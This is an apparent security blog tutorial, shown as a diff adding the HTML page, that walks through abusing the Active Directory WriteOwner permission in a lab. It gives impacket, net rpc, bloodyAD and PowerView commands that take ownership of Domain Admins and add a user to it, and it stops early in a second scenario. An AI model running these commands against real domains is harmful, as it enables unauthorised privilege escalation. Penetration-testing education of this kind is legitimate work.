@@ -1,0 +1,287 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/dacl-attacks/" rel="category tag">DACL Attacks</a></span>            </div>
+            <h1 class="post-title entry-title">Abusing AD-DACL: WriteOwner</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/abusing-ad-dacl-writeowner/" rel="bookmark"><time class="entry-date published" datetime="2024-12-11T13:52:24+00:00">December 11, 2024</time><time class="updated" datetime="2025-06-19T13:23:07+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000">In this post, we delve into <strong data-start="553" data-end="590">WriteOwner Active Directory abuse</strong>, a powerful technique that allows attackers to change the ownership of directory objects. Specifically, by abusing the WriteOwner permission in <strong>Discretionary Access Control Lists (DACLs)</strong>, adversaries can take over sensitive objects and escalate privileges within the domain.</span></p>
+<p><span style="color: #000000">To begin, we outline the lab setup necessary to simulate these attacks and map methods to the <strong>MITRE ATT&amp;CK</strong> <strong>framework</strong> to clarify the associated techniques and tactics. Additionally, we cover detection mechanisms for identifying suspicious activities linked to <strong>WriteOwner</strong> attacks, alongside actionable recommendations for mitigating these vulnerabilities. Overall, this overview equips security professionals with critical insights to recognize and defend against these prevalent threats.</span></p>
+<h3><span style="color: #800000">Table of Contents</span></h3>
+<p><strong><span style="color: #000000">Abusing AD-DACL- WriteOwner</span></strong></p>
+<p><strong><span style="color: #000000">WriteOwner Permission</span></strong></p>
+<p><strong><span style="color: #000000">Prerequisites</span></strong></p>
+<p><span style="color: #000000"><strong>Lab Setup</strong> – User Owns WriteOwner Permission on the Domain Admin Group</span></p>
+<p><span style="color: #000000"><strong>Exploitation Phase I</strong> – User Owns WriteOwner Permission on a Group</span></p>
+<p><span style="color: #000000"><strong>Bloodhound</strong> – Hunting for Weak Permission</span></p>
+<p><strong><span style="color: #000000">Method for Exploitation – Granting Ownership &amp; Full Control Followed by Account Manipulation (T1098)</span></strong></p>
+<ol>
+<li><span style="color: #000000">Linux Impacket tool – Granting Ownership &amp; Full Control</span>
+<ul>
+<li><span style="color: #000000">Linux – Adding Member to the Group</span></li>
+</ul>
+</li>
+</ol>
+<p><span style="color: #000000">Linux Net RPC – Samba</span></p>
+<p><span style="color: #000000">Linux Bloody AD</span></p>
+<ol start="2">
+<li><span style="color: #000000">Windows PowerShell Powerview – Granting Ownership &amp; Full Control</span>
+<ul>
+<li><span style="color: #000000">Windows Net command – Adding Member to the Group</span></li>
+</ul>
+</li>
+</ol>
+<p><span style="color: #000000"><strong>Lab Setup</strong> – User Owns WriteOwner Permission on Another User</span></p>
+<p><span style="color: #000000"><strong>Exploitation Phase II</strong> – User Owns WriteOwner Permission on Another User</span></p>
+<p><span style="color: #000000"><strong>Bloodhound</strong> – Hunting for Weak Permission</span></p>
+<p><span style="color: #000000"><strong>Method for Exploitation</strong> – Granting Ownership &amp; Full Control Followed by Kerberoasting (T1558.003) or Change Password (T1110.001)</span></p>
+<ol>
+<li><span style="color: #000000">Linux Impacket tool – Granting Ownership &amp; Full Control</span>
+<ul>
+<li><span style="color: #000000">Linux Python Script – TargetedKerberoast</span></li>
+<li><span style="color: #000000">Linux – Change Password</span></li>
+</ul>
+</li>
+</ol>
+<p><span style="color: #000000">Linux Net RPC – Samba</span></p>
+<p><span style="color: #000000">Linux Bloody AD</span></p>
+<ol start="2">
+<li><span style="color: #000000">Windows PowerShell Powerview – Granting Ownership &amp; Full Control</span>
+<ul>
+<li><span style="color: #000000">Windows PowerShell Powerview – Kerberoasting</span></li>
+<li><span style="color: #000000">Windows PowerShell Powerview – Change Password</span></li>
+</ul>
+</li>
+</ol>
+<p><strong><span style="color: #000000">Detection &amp; Mitigation</span></strong></p>
+<h3><span style="color: #800000">WriteOwner Permission</span></h3>
+<p><span style="color: #000000">The <strong>WriteOwner</strong> permission allows a user to change the ownership of an object to a different user or principal, including one controlled by an attacker. Consequently, an attacker can <strong data-start="1294" data-end="1321">exploit this permission</strong> to <strong data-start="1325" data-end="1343">take ownership</strong> of a target object.<br/>
+</span></p>
+<p><span style="color: #000000">Once the <strong>attacker</strong> successfully assumes <strong>ownership</strong>, they can fully <strong data-start="1434" data-end="1459">manipulate the object</strong>. This includes <strong data-start="1475" data-end="1500">modifying permissions</strong> to grant themselves or others <strong data-start="1531" data-end="1549">Full Control</strong> over the object. For example, the attacker could assign <strong data-start="1610" data-end="1640"><em data-start="1612" data-end="1626">Full Control</em> permissions</strong>, allowing <strong data-start="1651" data-end="1674">unrestricted access</strong> to <strong data-start="1678" data-end="1686">read</strong>, <strong data-start="1688" data-end="1697">write</strong>, or <strong data-start="1702" data-end="1712">delete</strong> the object.</span></p>
+<ul>
+<li data-start="2086" data-end="2280"><span style="color: #000000">Specifically, WriteOwner permissions on a group allow attackers to grant the right to add members to that group.</span></li>
+<li data-start="2086" data-end="2280"><span style="color: #000000">When applied to a user object, this permission enables attackers to gain full control over the account.</span></li>
+<li data-start="2086" data-end="2280"><span style="color: #000000">In the case of computer objects, it allows the attacker to obtain unrestricted access and control.</span></li>
+<li data-start="2086" data-end="2280"><span style="color: #000000">Finally, possessing WriteOwner permissions on a domain object enables the attacker to perform a DCSync operation, simulating a Domain Controller to extract sensitive credentials.</span></li>
+</ul>
+<h3><span style="color: #800000">Prerequisites</span></h3>
+<ul>
+<li><span style="color: #000000">Windows Server 2019 as Active Directory</span></li>
+<li><span style="color: #000000">Kali Linux</span></li>
+<li><span style="color: #000000">Tools: Bloodhound, Net RPC, Powerview, BloodyAD, Impacket</span></li>
+<li><span style="color: #000000">Windows 10/11 – As Client</span></li>
+</ul>
+<h3><span style="color: #800000">Lab Setup – User Owns WriteOwner Permission on the Domain Admin Group</span></h3>
+<p><span style="color: #000000"><strong>Create the AD Environment:</strong></span></p>
+<p><span style="color: #000000">To simulate an Active Directory environment, you will need a Windows Server as a Domain Controller (DC) and a client machine (Windows or Linux) where you can run enumeration and exploitation tools.</span></p>
+<p><span style="color: #000000"><strong>Domain Controller</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Install Windows Server (2016 or 2019 recommended).</span></li>
+<li><span style="color: #000000">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong></span></li>
+<li><span style="color: #000000">Set up the domain (e.g., <strong>local</strong>).</span></li>
+</ul>
+<p><span style="color: #000000"><strong>User Accounts</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Create a standard user account named<strong> Aaru</strong>.</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user aaru Password@1 /add /domain</pre>
+<p><span style="color: #000000"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEidSueOz337BGhvezBCAeq1kgpqcN1v8ieEv-RA-xvcbEzrAS6MKSDhZKVnWxsvJRpF96xoY43tTm-qo7qHERLmguxfhBmFK3CxBRZSXXSoLHyhpGw9CBphDVPzcP0F9LXO5nvllpuUqSHsF0EyG_C6kiEi11TCK6kiPg6DYzXuAFLWIp7d4sEbRhLwO6RF/s16000/1.png"/></strong></span></p>
+<p><span style="color: #000000"><strong>Assign the “WriteOwner” Privilege to Aaru:</strong></span></p>
+<p><span style="color: #000000">Once your AD environment is set up, you need to assign the <strong>“WriteOwner”</strong> privilege to <strong>Aaru </strong>over the<strong> Domain Admins </strong>group.</span></p>
+<p><span style="color: #000000"><strong>Steps</strong>:</span></p>
+<ul>
+<li><span style="color: #000000">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></li>
+<li><span style="color: #000000">Enable the <strong>Advanced Features</strong> view by clicking on <strong>View</strong> &gt; <strong>Advanced Features</strong>.</span></li>
+<li><span style="color: #000000">Locate the <strong>Domain Admins</strong> group in the Users container.</span></li>
+<li><span style="color: #000000">Right-click on <strong>Domain Admins</strong> and go to <strong>Properties</strong>.</span></li>
+</ul>
+<p><img fetchpriority="high" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPgb1iX3lbakRB5VaBENpcUrQFvc_I2iBeUJz5TQwHvCqHRTymVCEJAD_WpXosaljsa8FoRtlI9PQRW6ZfpOnWmo4fYEKjU_gAYVKrF62V9krhMuqrNChQXZQSYq_YdZtWQs4KKag5gRFnXtsLvuRER3EGSYs3V02gbLlIIoJTrUkmxgFgIEe4QzwNjq04/s16000/2.png" alt="WriteOwner Active Directory Abuse" width="914" height="876"/></p>
+<ul>
+<li><span style="color: #000000">Go to the <strong>Security</strong> tab, and click on <strong>Add</strong> button</span></li>
+</ul>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiimrDt6rcgYOdfTwqloYoAnIckXa59n3255C8FYge0BpPzT5UKTFY6naAtqGZmZf-eBhAxW03UgVxpSwreNxda2QIcb7_VRegDpKsMsKTUZlA8qKMBBo1UZR8EDQVWdL4yoVMmqPrKT0emR4HywVw7JxzPKGxgbSkvLlLu7YzTmkRt4hA7SHGv7Fl7Tl4y/s16000/3.png"/></p>
+<ul>
+<li><span style="color: #000000">In the “Enter the object name to select” box, type <strong>Aaru</strong> and click <strong>Check Names </strong>and click on OK.</span></li>
+</ul>
+<p><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoMhO9IC5iXhPQU8N8ppEyh-3idIMoyLLFJmCSTUAH00YdFZwOIX5xy7_CibBex3ngENBPxB6O0E3WmbwK95QLuy0Ozaj3mROT4MWgtnVEqCbuZMylSV8zIHjfqZusM_gt5BrY0DWCWWLGT69AXES7_htRJ-OY4nsSJK0t96yrvmfo8mZIL_Th9FVhZmDG/s16000/4.png" alt="WriteOwner Active Directory Abuse" width="683" height="368"/></p>
+<ul>
+<li><span style="color: #000000">Select <strong>Aaru </strong>user and in the <strong>Permissions</strong> section, and click on <strong>Advanced</strong> option</span></li>
+</ul>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjqjlZZxlCm1ADi5dyrYfiug5Dv-67xXKDjcCWartJ8CpzA0fVw_oRXENAwononnUJhQvqLI0lGMO9C8ANRd57efYiGsjxJIz33hH_Js__t1N-3HV2QWvED41m8EXTzyxywdpHXGO72lE51ANF6iSTJsCcBSVP26C_SZYf8TGHpi6tbTCS2Hes-r0wNIjyo/s16000/5.png"/></p>
+<ul>
+<li><span style="color: #000000">In the <strong>Advanced security settings </strong>box, double-click on <strong>Aaru</strong> user’s permission entry.</span></li>
+<li><span style="color: #000000">In the <strong>Permissions</strong>section, check the box for <strong>Modify Owner</strong></span></li>
+<li><span style="color: #000000">Apply the settings.</span></li>
+</ul>
+<p><img decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUJE6EChW3Z5ECSEOVVZyYgJopdfAxZYQ3Sjho3YBv5tCG8gZHVbem7QLu6VvI2mSwAjdCXRjboWi_mCj7eUu0U47AfV3jyzg1kPBNM7yXdO_Xi9NEDDv7g1pPOgX2IPVBvhmKVfLzNiOOB0_sfHtGgrGgpEwpQD0U8vF1m-2xmL9dRijvcslEC2_Fekj7/s16000/6.png" alt="WriteOwner Active Directory Abuse" width="979" height="980"/></p>
+<p><span style="color: #000000">At this point, <strong>Aaru</strong> now has <strong>WriteOwner </strong>rights over the <strong>Domain Admins</strong> group, meaning they can add themselves to the group.</span></p>
+<h3><span style="color: #800000">Exploitation Phase II – User Owns WriteOwner Permission on a Group</span></h3>
+<h3><span style="color: #000000">Bloodhound – Hunting for Weak Permission</span></h3>
+<p><span style="color: #000000"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Aaru</strong> has the <strong>WriteOwner</strong> permission on the <strong>Domain Admins</strong> group.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u aaru -p Password@1 -ns 192.168.1.6 -d ignite.local -c All</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2bKO4ZDc9jXkwVHHBo60zeuAaxJweQV6f-FQIbmBDjv_Ss-fFXUbAZwdzC1jsoB0rXwVtc_2wV_osOb45wEGRgi8vOTJGT8ejjtTTMpb0LQVtnTZRtjnuSHC9kOs7gshhf33_Et6YH8vvcp-dmUE1XVFTkL62_NSJMqn68lH8F6BsbPtsz7vGMlu61ZYS/s16000/7.png" alt="WriteOwner Active Directory Abuse" width="1334" height="625"/></p>
+<p><span style="color: #000000">From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the first degree of object control value is equal to 1.</span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjq6pzFpfGImiWVIsr7TZgQei398mYoW2P7R_txVuG79IMTxXr8sa0me02Sd5sEzVJJL-jgHf2ddOwUNXz08OIzqCU4JZxBh4CkR5jT60BekC-UO1FORKESH6WjmyZyR4xdmOfzk_dKoXQU73fK2dExO62Rlkeb5StQ7jPXVm96aNH2fIQ93YnRSKS-HXhd/s16000/8.png"/></p>
+<p><span style="color: #000000">Thus, it has shown the Aaru User has WriteOwner privilege over Domain Admins group.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhhwjGPXumTpmTJR6vHCHG0tXBPLtupJwx7QXphhZgQpM8eor0D-pVuMkKk6CN6Ja30YkCQEDZimEnoRYv3Tr5VEL3NwAXTkiFMJD70itLMDlkiR2EqJxZ8K1GhB1gLgqS57euHNUY7yyLBoegFzl4SjnkW3eRTa351EgU1_FAg9X72HXM5-FF93H0a6Nol/s16000/9.png" alt="WriteOwner Active Directory Abuse" width="889" height="537"/></p>
+<h3><span style="color: #800000">Method for Exploitation – Granting Ownership &amp; Full Control Followed by Account Manipulation (T1098)</span></h3>
+<p><span style="color: #000000"><strong>Linux Impacket tool – Granting Ownership &amp; Full Control</strong></span></p>
+<p><span style="color: #000000"><strong>Granting Ownership:</strong></span></p>
+<p><span style="color: #000000">From UNIX-like systems, this can be done with <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://github.com/SecureAuthCorp/impacket">Impacket</a></strong></span>‘s owneredit.py (Python), alternatively Impacket-owneredit</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-owneredit -action write -new-owner 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.6</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiUd6ldrjxhb-ULZlgzkowCroWVL3pkg7QC9Sh8StIxEE69gf8qYx1MU4I1y0krep7KhtqwYsHNMPt_Lx37aQtGIGvMb0IlTUepYMuGVmwoj6zODRufotfcisVb6tlxM7tYqXkAqaDUjcjHLv0V6TWbKfJRbE1ZFyNDtwGoDozJZLP7O4DWysIz9lpR_Feu/s16000/10.png"/></p>
+<p><span style="color: #000000">With the help of owneredit, the DACL for this object is successfully modified, <strong>aaru</strong> user now have <strong>Ownership </strong>over the<strong> group</strong>.</span></p>
+<p><span style="color: #000000"><strong>Granting Full Control:</strong></span></p>
+<p><span style="color: #000000">Let’s grant the user ‘Aaru’ <strong>full control</strong> over the Domain Admins group using Impacket’s dacledit tool.</span></p>
+<p><span style="color: #000000">From UNIX-like systems, this can be done with <span style="color: #0000ff"><strong><a style="color: #0000ff" href="https://github.com/SecureAuthCorp/impacket">Impacket</a>‘s</strong> </span>dacledit.py (Python), alternatively Impacket-dacledit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-dacledit -action 'write' -rights 'WriteMembers' -principal 'aaru' -target-dn 'CN=Domain Admins,CN=Users,DC=ignite,DC=local' 'ignite.local'/'aaru':'Password@1' -dc-ip 192.168.1.6</pre>
+<p><span style="color: #000000"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihYSKctiWUmmyvPbwALL_ycPQCUBCo4OWliAXEQXkc7Fl1iwdJxR0zTjFdCokXUZsGVbF79IIlqrUq6GK2_NcbODYPGR6ep3RA71kttsDwoXLXT22phyphenhyphenO1rGSChIEnNqFbv7RNvhGHA6WpcrIh06FeApp2jvJWihhBB4KLeApIF1yEQx9sLUlxPaA3w78e/s16000/11.png" alt="WriteOwner Active Directory Abuse" width="2972" height="1324"/></strong></span></p>
+<p><span style="color: #000000">With the help of dacledit, the DACL for this object is successfully modified, <strong>aaru</strong> user now have <strong>full Control</strong> over the<strong> group</strong>.</span></p>
+<h3><span style="color: #800000">Linux – Adding Member to the Group</span></h3>
+<p><span style="color: #000000"><strong>Linux Net RPC – Samba</strong></span></p>
+<p><span style="color: #000000">The tester can abuse this permission by adding Aaru User into Domain Admin group and list the domain admin members to ensure that Aaru Users becomes Domain Admin.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net rpc group addmem "Domain Admins" aaru -U ignite.local/aaru%'Password@1' -S 192.168.1.6</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-uE7du6lk9Z1vqu3iaEUH7oEWXjdLUAImHW0DKHqRVAukhRdxBiUDtAbQIRCQH017ihawrTJARvItcJLJ0MzoPhlClreJ-2QbGU6fVAcZXD6cW6tMZcf4m3P8A41b5KJw3HV8IsAaRQLNtkQu_k9myhfjoLF6YV_XulLoZUWoKceHPKvoXe3mFW5Kt0Bn/s16000/12.png"/></p>
+<p><span style="color: #000000"><strong>Linux Bloody AD</strong></span></p>
+<p><span style="color: #000000">Alternatively, it can be achieved using <span style="color: #0000ff"><a style="color: #0000ff" href="https://github.com/CravateRouge/bloodyAD"><strong>bloodyAD</strong></a></span></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host "192.168.1.6" -d "ignite.local" -u "aaru" -p "Password@1" add groupMember "Domain Admins" "aaru"</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhtYJejQqYV_t6DdSf-NQ0nPBQ3RzaquRBTGPU209lYPtlNuaxpg_trlZIBt9ntssoFPhQDi-rdzUS3WXwCYxupYyD0JJmvVZjsypJTFZOcCR2pk3BNIDytgvJzRt3xGteC9OtOxbeOfoPftaI_pO0ONnS03nfQDBFoxwvvSVys1j13pS1YpuUatZQHqlvp/s16000/13.png"/></p>
+<p><span style="color: #000000"><strong>Windows PowerShell Powerview – Granting Ownerahip &amp; Full Control</strong></span></p>
+<p><span style="color: #000000">From a Windows system, this can be achieved with <strong>Set-DomainObjectOwner </strong>to grant ownership followed by <strong>Add-DomainObjectAcl</strong> (<a style="color: #000000" href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"><strong>PowerView</strong></a> module) to grant full permission over the target.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
+Import-Module .PowerView.ps1
+Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'aaru'
+Add-DomainObjectAcl -Rights 'All' -TargetIdentity "Domain Admins" -PrincipalIdentity "aaru"</pre>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2KrCHGHRWqeyvVq8qGWOd9PARc65vT07QOD8wAo4wMk6hkpE9EG0Cq23Qs0WyeiZz8r0xloP7OwNf4USoUpw-cP_jGe4SQgk4Am2ai3gpVZxN6XTIJWbCWIdrJGdFl1grYh0_NTuN8Cz9uqSBYxlDU-YvroXL2-9TGCdq1HmxS6J-b5cp0EfZZksBWdG9/s16000/50.png" alt="WriteOwner Active Directory Abuse" width="1602" height="321"/></p>
+<p><span style="color: #000000"><strong>Windows Net command – Adding Member to the Group</strong></span></p>
+<p><span style="color: #000000">This can be achieved with a native command line, using windows net command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net group "domain admins" aaru /add /domain</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgpBHfhgyzHmRBayfzOB_k8RnaZexqZMu4hZQOHfyJ9-kcbYJigJ5bGIBYEbAy0qiWupYVU5mRsNmCtHnb_ciE8vDn07-pfM75J59OpUQeeSBwqn3_6pc7coLYkIyM8Z5XM_KKEWXLkmB4kdVTTjKrkhqQIOHf70s5T_4zW7wsabLwyYr5sQevW0HlSXM8R/s16000/51.png"/></p>
+<p><span style="color: #000000">thus, from user property we can see Aaru user has become the member of domain admin.</span></p>
+<p><span style="color: #000000"><strong> <img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjjsIXNIICh82CeYJ_Gfjo1NWLszVqIx82dgsAltOwRNtlENMmaqjw63GiYyynG9a3AxYUDS6Y7F5wN-ipqCSCCpa-V0z-XpvXK5doMy_0bPR9LhKHIecNgkAh-pJ_103NM533DqdOXBACscj07m-KBQyqIl40-AW95OGOLYHdNEmvRFkrecBMy5k5BzULJ/s16000/52.png" alt="WriteOwner Active Directory Abuse" width="1135" height="874"/></strong></span></p>
+<h3><span style="color: #800000">Lab Setup – User Owns WriteOwner Permission on Another User</span></h3>
+<p><span style="color: #000000">In this <strong data-start="263" data-end="276">lab setup</strong>, we will <strong data-start="286" data-end="309">simulate a scenario</strong> where one user has <strong data-start="329" data-end="356"><em data-start="331" data-end="343">WriteOwner</em> permission</strong> over another user. Specifically, we will create two users: <strong data-start="420" data-end="431"><em data-start="422" data-end="429">Ankur</em></strong> and <strong data-start="436" data-end="448"><em data-start="438" data-end="446">Sakshi</em></strong>, where <strong data-start="456" data-end="468"><em data-start="458" data-end="466">Sakshi</em></strong> is granted <strong data-start="480" data-end="504"><em data-start="482" data-end="494">WriteOwner</em> access_</strong> over <strong data-start="510" data-end="521"><em data-start="512" data-end="519">Ankur</em></strong>.</span></p>
+<h4><span style="color: #000000">Create the AD Environment and User accounts</span></h4>
+<p><span style="color: #000000">To begin, set up a <strong data-start="613" data-end="660"><em data-start="615" data-end="631">Windows Server</em> (2016 or 2019 recommended)</strong> as the <strong data-start="668" data-end="694">Domain Controller (DC)</strong> and prepare a <strong data-start="709" data-end="727">client machine</strong> (Windows or Linux) to run <strong data-start="754" data-end="792">enumeration and exploitation tools</strong>.</span></p>
+<h4><span style="color: #000000">Domain Controller:</span></h4>
+<ul>
+<li><span style="color: #000000">Install Windows Server (2016 or 2019 recommended).</span></li>
+<li><span style="color: #000000">Promote it to a Domain Controller by adding the <strong>Active Directory Domain Services</strong></span></li>
+<li><span style="color: #000000">Set up the domain (e.g., <strong>ignite.local</strong>).</span></li>
+</ul>
+<h4><span style="color: #000000">User Accounts:</span></h4>
+<ul>
+<li><span style="color: #000000">Next, <strong data-start="1088" data-end="1119">create two AD user accounts</strong> named <strong data-start="1126" data-end="1137"><em data-start="1128" data-end="1135">Ankur</em></strong> and <strong data-start="1142" data-end="1154"><em data-start="1144" data-end="1152">Sakshi</em></strong> using the following commands:</span></li>
+</ul>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net user ankur Password@1 /add /domain
+net user sakshi Password@1 /add /domain</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj3abzLlJ2O8LAB1zr26-w4ZrFpbEE9zYtwy4qfycP0a-XSPhoB1SyasohMWxVdhcvvik09ZjuTqdzD59BuEcsp9Swc__T60nB4urEf0KPqJejMz1nI24X30dnVAoN200f-5_wtugKIIinDwo95HtNvAu9wY4Hy4sY3ym8yXBVxzdFhmpnCPd_5yTOX9sat/s16000/53.png"/></p>
+<h4><span style="color: #000000">Assign the “WriteOwner” Privilege:</span></h4>
+<p><span style="color: #000000">After creating the users, proceed to <strong data-start="1375" data-end="1409">assign <em data-start="1384" data-end="1396">WriteOwner</em> permission</strong> to <strong data-start="1413" data-end="1425"><em data-start="1415" data-end="1423">Sakshi</em></strong> over the <strong data-start="1435" data-end="1446"><em data-start="1437" data-end="1444">Ankur</em></strong> user account.</span></p>
+<ol>
+<li><span style="color: #000000">Open <strong>Active Directory Users and Computers</strong> (ADUC) on the Domain Controller.</span></li>
+<li><span style="color: #000000">Enable the <strong>Advanced Features</strong> view by clicking on <strong>View</strong> &gt; <strong>Advanced Features</strong>.</span></li>
+<li><span style="color: #000000">Locate User <strong>Ankur</strong> in the <strong>Users</strong></span></li>
+<li><span style="color: #000000">Right-click on <strong>Ankur User</strong> and go to <strong>Properties</strong>.</span></li>
+</ol>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgrfs_t48lJW8CMnfCrH0MsxCy1Mssi80gGjOpy4sNnooMYSxAX1rvVw6WKrg3y80SEhEKcpBgNO0b4DNodE9Hw5mzvHxjA5kYzyarMrvZJc3rP1k08mW2bFQb1ViDXrHpkurM7UenIeiHglVemJ-rSA5fZeLgcwp4AwyJLzr7NgOVZ5bM2rz6ulXt6phSb/s16000/54.png" alt="WriteOwner Active Directory Abuse" width="797" height="862"/></p>
+<h5><span style="color: #000000"><strong>Modify Permissions</strong> </span></h5>
+<p><span style="color: #000000">      5. Navigate to the <strong>Security </strong>tab, and click on <strong>Add</strong> button</span></p>
+<p><span style="color: #000000">      6. In the “Enter the object name to select” box, type <strong>Sakshi </strong>and click <strong>Check Names, </strong>then click <strong>OK</strong>.</span></p>
+<p><span style="color: #000000">      7. Select the <strong data-start="1983" data-end="2011"><em data-start="1996" data-end="2004">Sakshi</em> user</strong>, and in the <strong data-start="2024" data-end="2039">Permissions</strong> section, click on <strong data-start="2058" data-end="2072"><em data-start="2060" data-end="2070">Advanced</em></strong></span></p>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgxWbICRF2A20ZnQzk0da8ypS8ydYHd4hzB14HxY7WH_yAv_PN9jJSdU9We5xkq4u0oYpvcMUEs8GFgsr_Jv04twXI-P2rQVP6Bgm3h4Pqkc-Y-ZKZSzCmEOk8-s727nDS5_O9QbbUCQENpIdsF5U_LsgN6_Lz6D6oAWIQPL4LiMGDtAcfMxzd8nZx5Prb9/s16000/55.png"/></p>
+<p><span style="color: #000000">      8.  In the <strong>Advanced security settings </strong>box, double-click on <strong>Sakshi</strong> user’s permission entry.</span></p>
+<p><span style="color: #000000">      9.  In the <strong>Permissions </strong>section, check on the box for <strong>Modify owner</strong></span></p>
+<p><span style="color: #000000">      10. Click <strong>Apply </strong>to save the settings.</span></p>
+<p><img loading="lazy" decoding="async" class="alignnone" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivJE10rP0Fkel0Y-uYegcayKJ94rCICsWALE_NwimnsHqcxZ1ZVBOe2Ned8lIG_ZGnrkdeFekKjcCtN4wVCJhFaAmGeMbgZ7xLl83wF-BEwFQw8WTVA6u7j_JQed-KRF6exrUyKkLjSXu-8szS4p89FrT2claBaalZzuO0E7N5HuB2Q6FEv6jlg1WC86BO/s16000/56.png" alt="WriteOwner Active Directory Abuse" width="1122" height="1194"/></p>
+<p><span style="color: #000000">At this point, the <strong data-start="2336" data-end="2387"><em data-start="2338" data-end="2346">Sakshi</em> user </strong>now holds <strong data-start="2336" data-end="2387"><em data-start="2362" data-end="2385">WriteOwner permission</em></strong> over the <strong data-start="2397" data-end="2420"><em data-start="2399" data-end="2406">Ankur</em> user object</strong>. As a result, Sakshi can <strong data-start="2450" data-end="2468">take ownership</strong> and potentially <strong data-start="2485" data-end="2508">escalate privileges</strong> or manipulate permissions on that object.</span></p>
+<h3><span style="color: #800000">Exploitation Phase I – User Owns WriteOwner Permission on Another User</span></h3>
+<h3><span style="color: #000000">Bloodhound – Hunting for Weak Permission</span></h3>
+<p><span style="color: #000000"><strong>Use BloodHound to Confirm Privileges</strong>: You can use <strong>BloodHound</strong> to verify that <strong>Sakshi</strong> has the <strong>WriteOwner</strong> permission for <strong>Ankur</strong> user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u sakshi -p Password@1 -ns 192.168.1.6 -d ignite.local -c All</pre>
